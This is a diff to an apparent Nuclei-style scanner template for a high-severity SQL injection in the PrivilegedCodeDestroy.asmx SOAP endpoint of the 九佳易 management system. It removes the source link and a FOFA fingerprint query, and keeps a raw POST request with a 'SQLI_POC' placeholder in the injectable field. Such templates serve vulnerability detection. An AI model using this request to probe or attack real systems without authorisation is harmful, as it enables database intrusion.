@@ -3,12 +3,8 @@ info:
   name: 九佳易管理系统 PrivilegedCodeDestroy.asmx 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/azsr5l6zxcwonh1g'
+  description: ''
   tags: sqli,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: azsr5l6zxcwonh1g
-    fofa: body="/XiTong/Index/W_IndexPbForm.win.js"
 http:
 - raw:
   - "POST /Interface/licx/PrivilegedCodeDestroy.asmx HTTP/1.1\nSOAPAction: [http://tempuri.org/UpdatePrivilegedState](http://tempuri.org/UpdatePrivilegedState)\nContent-Type: text/xml;charset=UTF-8\nHost: {{Hostname}}\n\n<soap:Envelope xmlns:soap=\"http://www.w3.org/2003/05/soap-envelope\" xmlns:tem=\"http://tempuri.org/\">\n   <soap:Header/>\n   <soap:Body>\n      <tem:UpdatePrivilegedState>\n         <!--type: string-->\n         <tem:code>SQLI_POC</tem:code>\n      </tem:UpdatePrivilegedState>\n   </soap:Body>\n</soap:Envelope>"
